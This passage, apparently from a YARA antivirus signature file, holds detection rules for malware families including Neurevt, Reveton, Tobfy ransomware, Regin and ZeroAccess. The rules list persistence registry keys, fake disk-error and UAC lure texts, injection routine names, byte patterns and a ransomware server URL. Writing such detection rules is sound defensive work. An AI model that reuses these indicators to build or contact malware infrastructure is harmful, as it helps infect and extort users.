$ = "Kaspersky Lab" ascii wide
$ = "FRISK Software International Ltd" ascii wide
$ = "ESET, spol. s r.o." ascii wide
$ = "Doctor Web Ltd" ascii wide
$ = "BitDefender SRL" ascii wide
$ = "BITDEFENDER LLC" ascii wide
$ = "Avira GmbH" ascii wide
$ = "GRISOFT, s.r.o." ascii wide
$ = "PC Tools" ascii wide
$ = "ALWIL Software" ascii wide
$ = "Agnitum Ltd" ascii wide
condition:
(8 of them) or $a
}rule SSC_TrojanWin32NedsymGSample
{
meta:
Description  = "Trojan.Nedsym.sm"
ThreatLevel  = "5"
strings:
$ = "qwertyuiopasdfghjklzxcvbnm123456789"  ascii wide
$ = "svcnost.exe"  ascii wide
$ = "Windows Init"  ascii wide
$ = "\\drivers\\etc\\hosts"  ascii wide
condition:
2 of them
}rule SSC_TrojanWin32NeurevtA_BackDoor
{
meta:
Description  = "Trojan.Neurevt.sm"
ThreatLevel  = "5"
strings:
$ = "%s\\__%08x.lnk" ascii wide
$ = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s" ascii wide
$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" ascii wide
$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "{2227A280-3AEA-1069-A2DE-08002B30309D}" ascii wide
$ = "schtasks.exe" ascii wide
$ = "SYSTEM\\CurrentControlSet\\Control\\Session Manager" ascii wide
$ = "Software\\Classes\\CLSID\\%s\\%08X\\%s" ascii wide
$ = "%s\\%08X.pif" ascii wide
$ = "Windows ha detectado una carpeta da" ascii wide
$ = "Mostrar Detalles" ascii wide
$ = "Mas informaci" ascii wide
$ = "Restaurar archivos" ascii wide
$ = "Restaurar archivos y chequear el disco en busca de errores" ascii wide
$ = "Erro de Disco Cr" ascii wide
$ = "O Windows encontrou uma pasta corrompida no seu disco r" ascii wide
$ = "Mostrar detalhes" ascii wide
$ = "Mais detalhes sobre esse erro" ascii wide
$ = "Restaurar os arquivos" ascii wide
$ = "Restaurar os arquivos e verificar erros no disco" ascii wide
$ = "Kritischer Festplattenfehler" ascii wide
$ = "Windows hat einen fehlerhaften Ordner auf deiner Festplatte vorgefunden." ascii wide
$ = "Mehrere fehlerhafte Dateien wurden in dem Ordner 'Eigene Dokumente' gefunden. Um Datenverlust zu ver" ascii wide
$ = "Details anzeigen" ascii wide
$ = "Mehr Details zu diesem Fehler" ascii wide
$ = "Dateien wiederherstellen" ascii wide
$ = "Dateien wiederherstellen und Festplatte auf Fehler " ascii wide
$ = "Erreur Critique" ascii wide
$ = "Windows a trouv" ascii wide
$ = "Plusieurs fichiers corrompu sont trouv" ascii wide
$ = "Montre d" ascii wide
$ = "Plus de d" ascii wide
$ = "Kritieke foutmelding" ascii wide
$ = "Windows heeft een beschadigde map gevonden" ascii wide
$ = "Meerdere beschadigde bestanden zijn in de map 'Mijn Documenten' gevonden. Om dataverlies te voorkome" ascii wide
$ = "Toon details" ascii wide
$ = "Meer details over deze foutmelding" ascii wide
$ = "Herstel bestanden" ascii wide
$ = "Herstel bestanden en controleer de harde schijf voor errors" ascii wide
$ = "Kritik disk hatas" ascii wide
$ = "Windows sabit diskinizde bozuk bir klas" ascii wide
$ = "Bu hata hakk" ascii wide
$ = "Dosyalar" ascii wide
$ = "Hata ayr" ascii wide
$ = "Kritis Disk Kesalahan" ascii wide
$ = "Windows telah mengalami rusak folder pada hard drive Anda" ascii wide
$ = "Beberapa file rusak telah ditemukan di folder 'My Documents'. Untuk mencegah kerugian serius data, p" ascii wide
$ = "Tampilkan detail" ascii wide
$ = "Lebih rinci tentang kesalahan ini" ascii wide
$ = "mengembalikan file" ascii wide
$ = "Kembalikan file dan memeriksa disk untuk kesalahan" ascii wide
$ = "Errore critico dell'hard disk" ascii wide
$ = "Windows ha trovato una cartella corrotta nel vostro hard disk." ascii wide
$ = "Mostra dettagli" ascii wide
$ = "Maggiori dettagli su quest'errore" ascii wide
$ = "Ripristina i file" ascii wide
$ = "Ripristina i file e controlla il disco per errori." ascii wide
$ = "Kriittinen Levy Virhe" ascii wide
$ = "Windows on t" ascii wide
$ = "Useita korruptoituneita tiedostoja on l" ascii wide
$ = "Palauta tiedostot" ascii wide
$ = "Palauta tiedostot ja etsi virheit" ascii wide
$ = "Problem, krytyczny stan dysku" ascii wide
$ = "Windows znalazl korupcyjny folder w twoim twardym dysku." ascii wide
$ = "Duza ilosc zepsutych plikow zostala znaleziona w swoim folderze 'My Documents'. Zeby zachowac pamiec" ascii wide
$ = "Pokaz wiecej informacji" ascii wide
$ = "Wiecej danych na temat bledu" ascii wide
$ = "Przywracanie plik" ascii wide
$ = "Critical Disk Error" ascii wide
$ = "Windows has encountered a corrupted folder on your hard drive" ascii wide
$ = "Multiple corrupted files have been found in the folder 'My Documents'. To prevent serious loss of da" ascii wide
$ = "Show details" ascii wide
$ = "More details about this error" ascii wide
$ = "Restore files and check disk for errors" ascii wide
$ = "http://answers.microsoft.com/en-us/windows/forum/windows_vista-windows_programs/corrupted-documents-folder/e2a7660f-8eea-4f27-b2e6-e77a0f0c1535" ascii wide
$ = "uac" ascii wide
$ = "nuac" ascii wide
$ = "Has denegado los privilegios de Windows para la utilidad de restauraci" ascii wide
$ = "Error en los privilegios" ascii wide
$ = "Erro de privil" ascii wide
$ = "Sie verweigerten Windows die Privilegien, das Dateiwiederherstellungswerkzeug zu nutzen. Bitte w" ascii wide
$ = "Privilegfehler" ascii wide
$ = "Vous avez rejet" ascii wide
$ = "Erreur de privil" ascii wide
$ = "U heeft de nodige rechten afgewezen voor de Windows herstelprocedure. Selecteer JA op de volgende UA" ascii wide
$ = "Toestemming error" ascii wide
$ = "Windows dosya restorasyon program" ascii wide
$ = "Izin hatas" ascii wide
$ = "Anda menyangkal hak-hak istimewa yang tepat untuk utilitas restorasi file Windows. Silakan pilih YES" ascii wide
$ = "Privilege Kesalahan" ascii wide
$ = "Hai negato i privilegi necessari a Windows per riparare i file. Selezione \"Si\" nella seguente finest" ascii wide
$ = "Errore nei privilegi" ascii wide
$ = "Et sallinut oikeuksia Windowsin tiedostojen palautus ohjelmistolle. Ole hyv" ascii wide
$ = "Windows file restoration utility" ascii wide
$ = "You denied the proper privileges to the Windows file restoration utility. Please select YES on the f" ascii wide
$ = "Privilege Error" ascii wide
$ = "local ip detected" ascii wide
$hex0 = { 55 8b ec 81 ec 04 01 00 00 83 ?? ?? ?? 56 57 0f ?? ?? ?? ?? ?? 8b ?? ?? e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? be 34 71 42 00 8b ce e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 81 c2 ae 17 00 00 8b ca e8 ?? ?? ?? ?? 83 f8 08 0f ?? ?? ?? ?? ?? 52 e8 ?? ?? ?? ?? 8b f8 85 ff 74 ?? 68 04 01 00 00 6a 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? a1 ?? ?? ?? ?? 56 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 57 68 68 a3 42 00 50 ff ?? ?? ?? ?? ?? 83 c4 14 57 e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? 68 d2 04 00 00 ff ?? ?? ?? ?? ?? 8b f0 ff ?? ?? ?? ?? ?? ff ?? ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 8b f8 83 fe 01 75 ?? 6a 00 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8b c7 eb ?? 33 c0 5f 5e c9 c2 04 00 55}
$hex1 = { 55 8b ec 81 ec 04 01 00 00 53 33 db 57 39 ?? ?? 0f ?? ?? ?? ?? ?? 8b ?? ?? 3b cb 0f ?? ?? ?? ?? ?? 39 ?? ?? 0f ?? ?? ?? ?? ?? 3b f3 0f ?? ?? ?? ?? ?? 39 ?? 0f ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 8b ?? ?? e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 81 c2 ae 17 00 00 8b ca e8 ?? ?? ?? ?? 83 f8 08 0f ?? ?? ?? ?? ?? 52 e8 ?? ?? ?? ?? 8b f8 3b fb 0f ?? ?? ?? ?? ?? 68 04 01 00 00 53 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? ff ?? ?? a1 ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 57 68 68 a3 42 00 50 ff ?? ?? ?? ?? ?? 83 c4 14 57 e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? 68 d2 04 00 00 ff ?? ?? ?? ?? ?? 8b f8 ff ?? ?? ?? ?? ?? ff ?? ?? 8b ?? ff ?? ?? 8d ?? ?? ?? ?? ?? 50 68 01 00 00 80 e8 ?? ?? ?? ?? 89 ?? 83 ff 01 75 ?? 53 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 39 ?? 0f 95 c0 eb ?? 32 c0 5f 5b c9 c2 0c 00}
$hex2 = { 55 8b ec 81 ec 98 06 00 00 8b cf e8 ?? ?? ?? ?? 83 f8 01 73 ?? 33 c0 40 c9 c3 53 56 57 32 db ff ?? ?? ?? ?? ?? 68 08 02 00 00 8b f0 6a 00 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 68 03 01 00 00 57 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? a1 ?? ?? ?? ?? 05 f2 14 00 00 50 56 ff ?? ?? ?? ?? ?? 85 c0 74 ?? a1 ?? ?? ?? ?? 05 f2 14 00 00 50 8b d7 e8 ?? ?? ?? ?? 85 c0 78 ?? 33 c0 40 e9 ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 57 e8 ?? ?? ?? ?? be 80 00 00 00 eb ?? ff ?? ?? ?? ?? ?? 83 f8 05 75 ?? 84 db 75 ?? 8b cf e8 ?? ?? ?? ?? 83 f8 01 72 ?? 57 e8 ?? ?? ?? ?? b3 01 56 57 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 57 ff ?? ?? ?? ?? ?? 8b f0 85 f6 74 ?? 68 00 c1 42 00 56 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 68 0c c1 42 00 56 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 6a 5c 5e 8b d7 e8 ?? ?? ?? ?? 40 50 57 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 50 8d ?? ?? ?? ?? ?? 50 8d ?? ?? ?? ?? ?? 68 18 c1 42 00 50 ff ?? ?? ?? ?? ?? 83 c4 10 6a 08 8d ?? ?? ?? ?? ?? 50 57 ff ?? ?? ?? ?? ?? 85 c0 75 ?? 6a 04 50 57 ff ?? ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 85 c0 75 ?? 68 8c 00 00 00 ff ?? ?? ?? ?? ?? 8d ?? ?? ?? ?? ?? 50 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 83 f8 05 75 ?? 8b cf e8 ?? ?? ?? ?? 83 f8 01 72 ?? 57 e8 ?? ?? ?? ?? eb ?? 32 c0 fe c8 0f b6 c0 f7 d8 1b c0 83 e0 02 eb ?? 6a 03 58 eb ?? 33 c0 5e 5b c9 c3}
$hex3 = { 55 8b ec 83 e4 f8 51 8b ?? ?? 57 85 d2 0f ?? ?? ?? ?? ?? 0f ?? ?? 66 85 c9 0f ?? ?? ?? ?? ?? 0f ?? ?? ?? 83 e8 00 0f ?? ?? ?? ?? ?? 48 74 ?? 48 0f ?? ?? ?? ?? ?? 48 0f ?? ?? ?? ?? ?? b8 1c 03 00 00 66 3b c8 0f ?? ?? ?? ?? ?? a1 ?? ?? ?? ?? 0f ?? ?? ?? 50 e8 ?? ?? ?? ?? 3c 01 0f ?? ?? ?? ?? ?? 52 e8 ?? ?? ?? ?? e9 ?? ?? ?? ?? b8 18 01 00 00 66 3b c8 75 ?? a1 ?? ?? ?? ?? 83 ?? ?? ?? 74 ?? 8d ?? ?? 8b cf e8 ?? ?? ?? ?? 83 f8 02 76 ?? 8b ?? ?? f6 c2 01 74 ?? e8 ?? ?? ?? ?? 83 f8 fe 75 ?? a1 ?? ?? ?? ?? 03 c0 e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? eb ?? f6 c2 02 74 ?? 57 e8 ?? ?? ?? ?? eb ?? f6 c2 04 74 ?? e8 ?? ?? ?? ?? eb ?? b8 24 14 00 00 66 3b c8 75 ?? a1 ?? ?? ?? ?? 0f ?? ?? ?? 50 e8 ?? ?? ?? ?? 3c 01 75 ?? 8b c2 e8 ?? ?? ?? ?? 33 c0 40 eb ?? 33 c0 5f 8b e5 5d c2 04 00}
$hex4 = { 8b ?? ?? c6 ?? ?? ?? ?? ff ?? ?? 83 f9 37 8b ?? ?? 7e ?? eb ?? c6 ?? ?? ?? ?? ff ?? ?? 8b ?? ?? 83 f9 40 7c ?? e8 ?? ?? ?? ?? eb ?? 8b ?? ?? c6 ?? ?? ?? ?? ff ?? ?? 83 ?? ?? ?? 7c ?? eb ?? c6 ?? ?? ?? ?? ff ?? ?? 8b ?? ?? 83 f9 38 7c ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? 8a ?? ?? 88 ?? ?? e9 ?? ?? ?? ??}
$hex5 = { 55 8b ec 51 51 56 33 f6 57 8b f9 3b c6 74 ?? 39 ?? ?? 74 ?? 3b fe 74 ?? 39 ?? ?? 74 ?? 6a 07 5a 39 ?? ?? 72 ?? 89 ?? ?? 89 ?? ?? 39 ?? ?? 76 ?? 53 eb ?? 33 f6 3b ?? ?? 77 ?? 8b ?? ?? 8d ?? ?? ?? 8a ?? ?? 3a ?? ?? 75 ?? ff ?? ?? 83 ?? ?? ?? 75 ?? 8d ?? ?? eb ?? 8a ?? ?? 88 ?? ?? 41 3b ca 72 ?? ff ?? ?? 46 83 fe 07 72 ?? eb ?? 83 ?? ?? ?? 42 8d ?? ?? 4f 3b ?? ?? 72 ?? 5b 8b ?? ?? eb ?? 83 c8 ff 5f 5e c9 c2 08 00}
condition:
(10 of them) or (any of ($hex*))
}rule SSC_MalwarePowerLoaderSample
{
meta:
Description  = "Trojan.PowerLoader.sm"
ThreatLevel  = "5"
strings:
$str_1 = "powerloader" ascii wide
$ = "inject64_section" ascii wide
$ = "inject64_event" ascii wide
$ = "inject_section" ascii wide
$ = "inject_event" ascii wide
$ = "loader.dat" ascii wide
$ = "Inject64End" ascii wide
$ = "Inject64Normal" ascii wide
$ = "Inject64Start" ascii wide
$ = "UacInject64End" ascii wide
$ = "UacInject64Start" ascii wide
condition:
(2 of them) or (any of ($str_*))
}rule SSC_TrojanRansomRevetonSample
{
meta:
Description  = "Trojan.Reveton.sm"
ThreatLevel  = "5"
strings:
$a = "JimmMonsterNew" ascii wide
$  = "regedit.exe" ascii wide
$  = "rundll32.exe" ascii wide
$  = "msconfig.lnk" ascii wide
$  = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" ascii wide
$  = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell" ascii wide
$  = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ctfmon.exe" ascii wide
condition:
(3 of them) or $a
}
rule SSC_TrojanWin32UrausySampleA
{
meta:
Description  = "Trojan.Urausy.sm"
ThreatLevel  = "5"
strings:
$a = { 55 89 E5 53 56 57 83 0D ?? ?? ?? ?? 01 31 C0 5F 5E 5B C9 C2 04 00 }
$b = { FF 15 ?? ?? ?? ?? 09 C0 0F 84 ?? ?? ?? ?? 8B 75 ?? 89 C3 6A 01 6A FF 6A 05 56 E8 }
condition:
$a and $b
}
rule SSC_TrojanRansomWin32TobfySample
{
meta:
Description  = "Trojan.Tobfy.sm"
ThreatLevel  = "5"
strings:
$ = "http://62.109.28.231/gtx3d16bv3/upload/img.jpg" ascii wide
$ = "http://62.109.28.231/gtx3d16bv3/upload/mp3.mp3" ascii wide
$ = "Pay MoneyPak" ascii wide
$ = "You have 72 hours to pay the fine!" ascii wide
$ = "Wait! Your request is processed within 24 hours." ascii wide
$a = "G:\\WORK\\WORK_PECEPB\\Work_2012 Private\\Project L-0-ck_ER\\NEW Extern\\inject\\injc\\Release\\injc.pdb" ascii wide
$b = "G:\\WORK\\WORK_PECEPB\\Work_2012 Private\\Project L-0-ck_ER\\Version V 1.0\\V1.0\\Release\\te.pdb" ascii wide
$ = "picture.php?pin=" ascii wide
$ = "s\\sound.mp3" ascii wide
$ = "s\\1.jpg" ascii wide
$ = "s\\1.bmp" ascii wide
$ = "getunlock.php" ascii wide
condition:
(4 of them) or $a or $b
}rule SSC_Regin_APT_KernelDriver_Generic_A {
meta:
Description = "Trojan.Regin.A.sm"
ThreatLevel = "5"
strings:
$m1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }
$s0 = "atapi.sys" fullword wide
$s1 = "disk.sys" fullword wide
$s3 = "h.data" fullword ascii
$s4 = "\\system32" fullword ascii
$s5 = "\\SystemRoot" fullword ascii
$s6 = "system" fullword ascii
$s7 = "temp" fullword ascii
$s8 = "windows" fullword ascii
$x1 = "LRich6" fullword ascii
$x2 = "KeServiceDescriptorTable" fullword ascii
condition:
$m1 and all of ($s*) and 1 of ($x*)
}
rule SSC_Regin_APT_KernelDriver_Generic_B {
meta:
Description = "Trojan.Regin.B.sm"
ThreatLevel = "5"
strings:
$s1 = { 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e }
$s2 = "H.data" fullword ascii nocase
$s3 = "INIT" fullword ascii
$s4 = "ntoskrnl.exe" fullword ascii
$v1 = "\\system32" fullword ascii
$v2 = "\\SystemRoot" fullword ascii
$v3 = "KeServiceDescriptorTable" fullword ascii
$w1 = "\\system32" fullword ascii
$w2 = "\\SystemRoot" fullword ascii
$w3 = "LRich6" fullword ascii
$x1 = "_snprintf" fullword ascii
$x2 = "_except_handler3" fullword ascii
$y1 = "mbstowcs" fullword ascii
$y2 = "wcstombs" fullword ascii
$y3 = "KeGetCurrentIrql" fullword ascii
$z1 = "wcscpy" fullword ascii
$z2 = "ZwCreateFile" fullword ascii
$z3 = "ZwQueryInformationFile" fullword ascii
$z4 = "wcslen" fullword ascii
$z5 = "atoi" fullword ascii
condition:
all of ($s*) and ( all of ($v*) or all of ($w*) or all of ($x*) or all of ($y*) or all of ($z*) )
}
rule SSC_Regin_APT_KernelDriver_Generic_C {
meta:
Description = "Trojan.Regin.C.sm"
ThreatLevel = "5"
/*description = "Generic rule for Regin APT kernel driver Malware - Symantec http://t.co/qu53359Cb2"
author = "@Malwrsignatures - included in APT Scanner THOR"
date = "23.11.14"
hash1 = "e0895336617e0b45b312383814ec6783556d7635"
hash2 = "732298fa025ed48179a3a2555b45be96f7079712"  */
strings:
$s0 = "KeGetCurrentIrql" fullword ascii
$s1 = "5.2.3790.0 (srv03_rtm.030324-2048)" fullword wide
$s2 = "usbclass" fullword wide
$x1 = "PADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" ascii
$x2 = "Universal Serial Bus Class Driver" fullword wide
$x3 = "5.2.3790.0" fullword wide
$y1 = "LSA Shell" fullword wide
$y2 = "0Richw" fullword ascii
condition:
all of ($s*) and ( all of ($x*) or all of ($y*) )
}
rule SSC_TrojanSirefefZerroAccess
{
meta:
Description  = "Trojan.Sirefef.sm"
ThreatLevel  = "5"
strings:
//$ = "n64" ascii wide
//$ = "n32" ascii wide
//$ = "$Recycle.Bin\\" ascii wide
$ = "\\$%08x%04x%04x%02x%02x%02x%02x%02x%02x%02x%02x" ascii wide
//$ = "{%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}"  ascii wide
$ = "%wZ\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" ascii wide
$ = "%wZ\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"  ascii wide
$ = "%wZ\\Software\\Classes\\clsid" ascii wide
$ = "\\registry\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\" ascii wide
$ = "\\registry\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide
$ = "\\systemroot\\system32\\config" ascii wide
$ = "\\??\\ACPI#PNP0303#2&da1a3ff&0" ascii wide
$ = "GoogleUpdate.exe" ascii wide
$ = "Google Update Service (gupdate)" ascii wide
$ = "%sU\\%08x.@" ascii wide
$ = "\\??\\%sU" ascii wide
$ = "\\??\\%s@" ascii wide
$ = "%08x.@" ascii wide
$ = "%08x.$" ascii wide
$ = "%08x.~" ascii wide
$ = "\\??\\%08x" ascii wide
$ = "\\n." ascii wide
$ = "wbem\\fastprox.dll" ascii wide
$ = "c:\\windows\\system32\\z" ascii wide
$s1 = "e:\\sz\\x64\\release\\InCSRSS.pdb"  ascii wide
$s2 = "C:\\Jinket\\Lownza\\Kueshmmba\\de.pdb" ascii wide
$s3 = "E:\\Marlne\\Bensjo\\Ernstedun\\Rugriayid\\Wasp851.pdb" ascii wide
$hex0 = { 55 8b ec 83 ec 48 53 56 57 ff ?? ?? ?? ?? ?? ff ?? ?? ?? ?? ?? 8d ?? ?? ?? 59 8b c6 e8 ?? ?? ?? ?? 8b c6 89 ?? ?? e8 ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 89 ?? ?? ff ?? ?? ?? ?? ?? 68 08 54 30 6a ff ?? ?? ff d6 ff ?? ?? ?? ?? ?? 68 18 54 30 6a ff ?? ?? ff d6 83 c4 18 83 ?? ?? ?? ?? ?? ?? 75 ?? 8b ?? ?? ?? ?? ?? bb 98 70 30 6a bf 00 00 10 00 eb ?? ff ?? ?? ff ?? ?? ?? ?? ?? 68 a0 0f 00 00 ff ?? ?? ?? ?? ?? 53 57 8d ?? ?? 50 ff d6 85 c0 7d ?? 68 60 ea 00 00 ff ?? ?? ?? ?? ?? bb 54 70 30 6a eb ?? ff ?? ?? ff ?? ?? ?? ?? ?? 6a 01 68 e0 93 04 00 ff ?? ?? ?? ?? ?? ff ?? ?? e8 ?? ?? ?? ?? 53 57 8d ?? ?? 50 ff d6 85 c0 7d ?? bf 20 71 30 6a 57 ff ?? ?? ?? ?? ?? 6a 00 ff ?? ?? 8d ?? ?? e8 ?? ?? ?? ?? 50 6a 00 ff ?? ?? 8d ?? ?? e8 ?? ?? ?? ?? 50 e8 ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 33 c0 8d ?? ?? 5f 5e 5b c9 c2 04 00}
$hex1 = { 55 8b ec 83 ec 18 56 57 8d ?? ?? 50 e8 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? be 00 08 00 00 8b c6 e8 ?? ?? ?? ?? 8b fc 33 c0 b9 30 00 fe 7f 66 ?? ?? ?? 66 ?? ?? ?? 89 ?? ?? 0f ?? ?? 0f ?? ?? ?? 8b ?? ?? 66 ?? ?? ?? 66 ?? ?? ?? 41 41 66 83 f8 5c 75 ?? 66 ?? ?? ?? 83 ?? ?? ?? ?? ?? ?? b8 28 55 30 6a 72 ?? b8 3c 55 30 6a 50 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 66 ?? ?? ?? 66 ?? ?? ?? 0f b7 c8 01 ?? ?? 33 c0 50 66 ?? ?? ?? 8b ?? ?? ff ?? 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 0f ?? ?? ?? 0f ?? ?? ?? 2b c8 83 f9 50 0f ?? ?? ?? ?? ?? 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 0f ?? ?? ?? 51 ff ?? ?? 8b ?? ?? 03 c1 68 58 55 30 6a 50 ff ?? ?? ?? ?? ?? 57 ff ?? ?? ?? ?? ?? 83 c4 38 6a 02 5a 40 33 c9 f7 e2 0f 90 c1 f7 d9 0b c1 50 6a 00 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 85 c0 74 ?? 57 50 ff ?? ?? ?? ?? ?? 59 33 c0 59 40 eb ?? 33 c0 8d ?? ?? 5f 5e c9 c2 04 00}
$hex2 = { 8b ?? ?? ?? 83 e8 00 74 ?? 48 75 ?? ff ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? e8 ?? ?? ?? ?? e8 ?? ?? ?? ?? 85 c0 74 ?? e8 ?? ?? ?? ?? 85 c0 74 ?? 6a 00 6a 00 ff ?? ?? ?? 68 62 13 30 6a 68 00 00 08 00 6a 00 ff ?? ?? ?? ?? ?? eb ?? a1 ?? ?? ?? ?? 85 c0 74 ?? 50 ff ?? ?? ?? ?? ?? a1 ?? ?? ?? ?? 85 c0 74 ?? 50 ff ?? ?? ?? ?? ?? 33 c0 40 c2 0c 00}
$hex3 = { 55 8b ec 51 51 53 56 8b ?? ?? 56 ff ?? ?? ?? ?? ?? 8b d8 85 db 0f ?? ?? ?? ?? ?? 57 6a 40 68 00 10 00 00 ff ?? ?? 6a 00 ff ?? ?? ?? ?? ?? 8b f8 89 ?? ?? 85 ff 0f ?? ?? ?? ?? ?? 8b ?? ?? f3 ?? 0f ?? ?? ?? 0f ?? ?? ?? 8d ?? ?? ?? 83 c0 0c 8b ?? 8b ?? ?? 8b ?? ?? 03 f1 03 f9 8b ?? ?? 83 c0 28 4a f3 ?? 75 ?? 8b ?? ?? 8b ?? ?? ?? ?? ?? 2b ?? ?? 8d ?? ?? 50 6a 05 6a 01 ff ?? ?? ff d7 85 c0 74 ?? eb ?? 8b ?? ?? 29 ?? ?? 56 8d ?? ?? 8b ?? 03 ?? ?? 83 c1 f8 52 d1 e9 51 50 ff ?? ?? ?? ?? ?? 83 ?? ?? ?? 75 ?? 8d ?? ?? 50 6a 01 6a 01 ff ?? ?? ff d7 85 c0 74 ?? 8d ?? ?? 8b ?? 85 c0 74 ?? 8b f1 8b ?? ?? 03 c1 50 ff ?? ?? ?? ?? ?? 83 c6 14 8b ?? 85 c0 75 ?? 8b ?? ?? 5f 5e 5b c9 c2 04 00}
$hex4 = { 8b ?? ?? ?? ?? ?? b8 00 20 00 00 66 ?? ?? ?? ?? ?? ?? 75 ?? e8 ?? ?? ?? ?? 8b ?? ?? ?? 48 75 ?? 56 ff ?? ?? ?? ff ?? ?? ?? ?? ?? 33 f6 56 6a 04 56 68 0a 1d 40 00 56 56 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 3b c6 74 ?? 56 50 ff ?? ?? ?? ?? ?? 5e b0 01 c2 0c 00}
$hex5 = { 55 8b ec 83 e4 f8 83 ec 34 53 56 57 33 db 53 6a 18 8d ?? ?? ?? 50 53 ff ?? ?? ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 8b ?? ?? ?? 89 ?? ?? ?? 33 c0 8d ?? ?? ?? ab 8d ?? ?? ?? 50 68 00 90 42 00 68 ff ff 1f 00 8d ?? ?? 50 ff ?? ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 8b ?? ?? 8b ?? ?? ?? ?? ?? 3b c3 74 ?? 48 50 ff ?? ?? e8 ?? ?? ?? ?? e9 ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 6a 02 53 53 8d ?? ?? ?? 50 ff ?? ?? 6a ff 6a ff ff d6 85 c0 7c ?? 6a 02 53 53 8d ?? ?? ?? 50 ff ?? ?? 6a fe 6a ff ff d6 85 c0 7c ?? 6a 20 53 8d ?? ?? ?? 50 68 20 90 42 00 68 9f 01 12 00 8d ?? ?? ?? 50 ff ?? ?? ?? ?? ?? 85 c0 7c ?? 53 53 6a 08 8d ?? ?? ?? 50 8d ?? ?? ?? 50 53 53 53 ff ?? ?? ?? ff ?? ?? ?? ?? ?? ff ?? ?? ?? ff d7 68 18 90 42 00 6a 01 ff ?? ?? ?? ?? ?? ff ?? ?? ff d7 5f 5e 5b 8b e5 5d c2 08 00}
$hex6 = { 55 8b ec 51 68 c2 7e 42 00 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 8d ?? ?? 51 68 02 23 00 00 6a 00 50 ff ?? ?? ?? ?? ?? 85 c0 7c ?? a1 ?? ?? ?? ?? 8b ?? ?? ?? ?? ?? 85 c0 75 ?? b8 53 50 43 33 68 00 00 40 00 50 ff ?? ?? ?? ?? ?? ff ?? ?? c9 c3}
